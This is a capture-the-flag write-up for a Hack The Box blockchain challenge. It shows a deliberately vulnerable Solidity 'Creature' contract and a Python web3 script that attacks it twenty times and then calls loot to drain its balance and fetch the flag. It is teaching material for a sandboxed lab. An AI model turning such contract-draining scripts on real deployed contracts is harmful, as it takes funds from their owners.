# Survival of the Fittest

## Description
```
Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. 
When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. 
But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. 
As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. 
But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. 
She froze, heart pounding in her chest as she realized that she was face to face with her first monster.
```

## Provided Files
```
- Setup.sol
- Creature.sol
```

## Writeup

I started off by taking a look at the provided `solidity` files. <br/>
`Setup.sol`: <br/>
```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```
The only interesting thing above is the function `isSolved()`. <br/>
It basically checks if the `balance` of `Creature-contract` is zero or not. <br/>

`Creature.sol`: <br/>
```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```

The code above has the main game logic inside. <br/>
To set the `balance` of the `Creature-contract` to zero we have to attack the `Creature` 20 times. <br/>
My thought process was that I need to call the `strongAttack()` function 20 times to reduce its `lifePoitns` to `0`. <br/>
Also after doing this I needed to call the `loot()` function to finish the challenge. <br/>
To do this I made a simple python-script using `web3` library. <br/>
```py
from web3 import Web3
import requests

base_URL = 'http://PROVIDED_IP/'

# Get wallet values
res = requests.get(f'{base_URL}/connection_info')
data = res.json()


web3 = Web3(Web3.HTTPProvider(f'{base_URL}rpc'))

# Provided values
private_key = data['PrivateKey']
account_address = data['Address']
setup_contract_address = data['setupAddress']
target_contract_address = data['TargetAddress']

# Basic setup
setup_contract_abi = [
    {
        "constant": True,
        "inputs": [],
        "name": "TARGET",
        "outputs": [{"name": "", "type": "address"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    }
]

creature_contract_abi = [
    {
        "constant": False,
        "inputs": [{"name": "_damage", "type": "uint256"}],
        "name": "strongAttack",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "punch",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "loot",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# Load contracts
setup_contract = web3.eth.contract(address=setup_contract_address, abi=setup_contract_abi)
target_contract = web3.eth.contract(address=target_contract_address, abi=creature_contract_abi)

def exploit():
    # Call strongAttack func() repeatedly
    for _ in range(20):
        tx_hash = target_contract.functions.strongAttack(1).transact({'from': account_address, 'gas': 100000})
        web3.eth.wait_for_transaction_receipt(tx_hash)

    # Call loot func() to claim contract-balance
    tx_hash = target_contract.functions.loot().transact({'from': account_address, 'gas': 100000})

exploit()


# Grab flag after exploiting
res = requests.get(f'{base_URL}/flag')

print(res.text)
```

Executing the script I was able to exploit the service. <br/>
```sh
$ python3 ./req.py
HTB{REDACTED}
```

Obtaining the flag concludes this writeup.